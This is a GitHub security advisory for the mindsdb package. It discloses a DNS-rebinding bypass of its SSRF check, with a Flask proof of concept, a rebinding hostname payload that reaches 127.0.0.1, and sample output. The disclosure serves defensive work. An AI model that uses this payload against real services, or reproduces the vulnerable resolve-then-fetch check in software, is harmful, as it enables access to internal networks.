# Bypass SSRF Protection with DNS Rebinding

Critical

[ZoranPandovski](/ZoranPandovski)
published
GHSA-4jcv-vp96-94xr
Sep 5, 2024

## Package

pip

mindsdb
([pip](/advisories?query=ecosystem%3Apip))

## Affected versions

Before v23.12.4.2

## Patched versions

v23.12.4.3

## Description

### Summary

DNS rebinding is a method of manipulating resolution of domain names to let the initial DNS query hits an address and the second hits another one. For instance the host `make-190.119.176.200-rebind-127.0.0.1-rr.1u.ms` would be initially resolved to `190.119.176.200` and the next DNS issue to `127.0.0.1`. Please notice the following in the latest codebase:

```
def is_private_url(url: str):
    """
    Raises exception if url is private

    :param url: url to check
    """

    hostname = urlparse(url).hostname
    if not hostname:
        # Unable to find hostname in url
        return True
    ip = socket.gethostbyname(hostname)
    return ipaddress.ip_address(ip).is_private
```

As you can see, during the call to `is_private_url()` the initial DNS query would be issued by `ip = socket.gethostbyname(hostname)` to an IP (public one) and then due to DNS Rebinding, the next GET request would goes to the private one.

### PoC

```
from flask import Flask, request, jsonify
from urllib.parse import urlparse
import socket
import ipaddress
import requests

app = Flask(__name__)

def is_private_url(url: str):
    """
    Raises exception if url is private

    :param url: url to check
    """

    hostname = urlparse(url).hostname
    if not hostname:
        # Unable to find hostname in url
        return True
    ip = socket.gethostbyname(hostname)
    if ipaddress.ip_address(ip).is_private:
        raise Exception(f"Private IP address found for {url}")

@app.route("/", methods=["GET"])
def index():
    return "http://127.0.0.1:5000/check_private_url?url=https://www.google.Fr"

@app.route("/check_private_url", methods=["GET"])
def check_private_url():
    url = request.args.get("url")

    if not url:
        return jsonify({"error": 'Missing "url" parameter'}), 400

    try:
        is_private_url(url)
        response = requests.get(url)

        return jsonify(
            {
                "url": url,
                "is_private": False,
                "text": response.text,
                "status_code": response.status_code,
            }
        )
    except Exception as e:
        return jsonify({"url": url, "is_private": True, "error": str(e)})

if __name__ == "__main__":
    app.run(debug=True)
```

After running the poc.py with flask installed, consider visiting the following URLs:

1. <http://127.0.0.1:5000/check_private_url?url=https://www.example.com> since it is in the public space, you would get `is_private: false` and the GET request would be issued to the [www.Example.com](http://www.Example.com) website.
2. <http://127.0.0.1:5000/check_private_url?url=http://localhost:8667>, this one the address is private, you would get `is_private: true`
3. <http://127.0.0.1:5000/check_private_url?url=http://make-190.119.176.214-rebind-127.0.0.1-rr.1u.ms:8667/> But this one, it initially returns the public IP `190.119.176.214` and then DNS rebind into the network location `127.0.0.1:8667`.

I set up a simple HTTP server at `127.0.0.1:8667`, you can notice the results of the PoC in the next screenshot:

```
{
  "is_private": false,
  "status_code": 200,
  "text": "<pre>\n<a href=\"poc.py\">poc.py</a>\n</pre>\n",
  "url": "http://make-190.119.176.214-rebind-127.0.0.1-rr.1u.ms:8667/"
}

```
### Impact

* Bypass the SSRF protection on the whole website with DNS Rebinding.
* DoS too.

# CVSS v3 base metrics

Attack vector:
More severe the more the remote (logically and physically) an attacker can be in order to exploit the vulnerability.

Attack complexity:
More severe for the least complex attacks.

Privileges required:
More severe if no privileges are required.

User interaction:
More severe when no user interaction is required.

Scope:
More severe when a scope change occurs, e.g. one vulnerable component impacts resources in components beyond its security scope.

Confidentiality:
More severe when loss of data confidentiality is highest, measuring the level of data access available to an unauthorized user.

Integrity:
More severe when loss of data integrity is the highest, measuring the consequence of data modification possible by an unauthorized user.

Availability:
More severe when the loss of impacted component availability is highest.
